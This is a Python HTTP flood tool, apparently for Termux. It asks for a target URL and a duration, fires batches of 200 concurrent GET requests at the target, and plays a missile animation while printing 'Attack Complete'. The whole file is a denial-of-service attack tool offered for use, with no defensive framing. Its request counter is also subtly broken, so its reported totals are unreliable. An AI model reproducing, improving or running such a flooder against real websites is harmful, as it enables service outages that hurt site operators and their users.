import asyncio
import aiohttp
import random
import time
import os
import shutil

# Terminal size
TERMINAL_SIZE = shutil.get_terminal_size((80, 40))
TERMINAL_WIDTH = TERMINAL_SIZE.columns
TERMINAL_HEIGHT = TERMINAL_SIZE.lines - 4  # leave 4 lines for metrics

# Clear terminal
def clear():
    print("\033[H\033[J", end="")  # ANSI clear for Termux

# Countdown loader
async def countdown_loader(seconds):
    for i in range(seconds, 0, -1):
        clear()
        print(f"SG - RELOADING | {i}s")
        await asyncio.sleep(1)

# Perfect small missile (centered)
MISSILE_BODY = [
"  /\\  ",
" |=|  ",
" |=|  ",
" |=|  ",
" |=|  "
]

# Exhaust colors
EXHAUST_FRAMES = [
    "\033[31m ^^^ \033[0m",
    "\033[33m *** \033[0m",
    "\033[91m !!! \033[0m",
    "\033[93m ::: \033[0m"
]

# Global metrics
total_sent = 0
max_rps = 0

class Missile:
    def __init__(self):
        self.reset()

    def reset(self):
        self.x = TERMINAL_WIDTH // 2 - len(MISSILE_BODY[0]) // 2
        self.y = TERMINAL_HEIGHT
        self.speed = random.choice([1,2,3])
        self.active = False
        self.launch_delay = random.uniform(1,3)
        self.exhaust = random.choice(EXHAUST_FRAMES)

    def move(self):
        if self.active:
            self.y -= self.speed
            if self.y < -len(MISSILE_BODY):
                self.reset()
                self.active = False

# Draw missile + live metrics
def draw_missiles(missiles):
    buffer = [""] * (TERMINAL_HEIGHT)
    for missile in missiles:
        if missile.active:
            for i, line in enumerate(MISSILE_BODY):
                pos = missile.y - len(MISSILE_BODY) + i
                if 0 <= pos < TERMINAL_HEIGHT:
                    buffer[pos] += " " * missile.x + line
            exhaust_pos = missile.y
            if 0 <= exhaust_pos < TERMINAL_HEIGHT:
                buffer[exhaust_pos] += " " * missile.x + random.choice(EXHAUST_FRAMES)

    clear()
    print("\n".join(buffer))
    # Print live metrics below animation
    print(f"T-T-S-R: {total_sent}")
    print(f"M-R-P-S: {max_rps}")

# HTTP requests sender
async def send_requests(target, duration):
    global total_sent, max_rps
    semaphore = asyncio.Semaphore(200)
    end_time = time.time() + duration
    local_rps = 0
    rps_start = time.time()

    async def fetch(session):
        nonlocal local_rps
        async with semaphore:
            try:
                async with session.get(target) as response:
                    await response.text()
                    total_sent += 1
                    local_rps += 1
            except:
                pass

    async with aiohttp.ClientSession() as session:
        while time.time() < end_time:
            tasks = [fetch(session) for _ in range(200)]
            await asyncio.gather(*tasks)
            await asyncio.sleep(0.1)
            # Update max RPS every second
            if time.time() - rps_start >= 1:
                max_rps = max(max_rps, local_rps)
                local_rps = 0
                rps_start = time.time()

# Main loop
async def main():
    global total_sent, max_rps
    target = input("¿TARGZ > ")
    duration = int(input("¿DU > "))

    await countdown_loader(5)

    missiles = [Missile() for _ in range(2)]  # mini swarm cinematic

    # Start HTTP requests
    request_task = asyncio.create_task(send_requests(target, duration))

    start_time = time.time()
    last_launch_times = [0]*len(missiles)

    while time.time() - start_time < duration:
        now = time.time()
        for idx, missile in enumerate(missiles):
            if not missile.active and now - last_launch_times[idx] >= missile.launch_delay:
                missile.active = True
                last_launch_times[idx] = now
            missile.move()
        draw_missiles(missiles)
        await asyncio.sleep(0.05)

    await request_task
    print("=== TOS-1: Attack Complete ===")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        clear()
        print("TOS-1 terminated by user.")
